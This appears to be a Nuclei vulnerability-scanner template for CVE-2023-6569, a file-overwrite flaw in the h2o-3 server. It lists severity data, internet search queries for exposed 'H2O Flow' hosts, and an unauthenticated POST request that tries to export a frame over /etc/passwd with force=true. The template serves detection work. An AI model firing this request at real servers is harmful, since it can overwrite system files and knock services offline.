id: CVE-2023-6569

info:
  name: External Control of File Name or Path in h2oai/h2o-3
  author: ProjectDiscoveryAI
  severity: high
  description: |
    The vulnerability allows remote unauthenticated attackers to overwrite arbitrary server files with attacker-controllable data, potentially leading to denial of service or exploitation of services that consume the exported file formats.
  impact: |
    Potential unauthorized access or data manipulation.
  remediation: |
    Apply the vendor-supplied patch or update to the latest version to mitigate the vulnerability.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:H
    cvss-score: 8.2
    cve-id: CVE-2023-6569
    cwe-id: CWE-610,CWE-73
    epss-score: 0.00053
    epss-percentile: 0.22585
    cpe: cpe:2.3:a:h2o:h2o:3.40.0.4:*:*:*:*:*:*:*
  metadata:
    vendor: h2o
    product: h2o
    shodan-query: title:"H2O Flow"
    fofa-query: title="h2o flow"
    google-query: intitle:"h2o flow"

http:
  - method: POST
    path:
      - "{{BaseURL}}/3/Frames/someattackerimportedframename/export?path=/etc/passwd&force=true"

    headers:
      User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0
      Accept: application/json, text/javascript, */*; q=0.01
      Accept-Language: en-US,en;q=0.5
      Accept-Encoding: gzip, deflate
      X-Requested-With: XMLHttpRequest
      Connection: close
      Referer: http://127.0.0.1:54321/flow/index.html
      Sec-Fetch-Dest: empty
      Sec-Fetch-Mode: cors
      Sec-Fetch-Site: same-origin
      Content-Length: 0
    matchers:
      - type: word
        words:
          - "File overwritten"
          - "Access denied"
        part: body
        condition: or
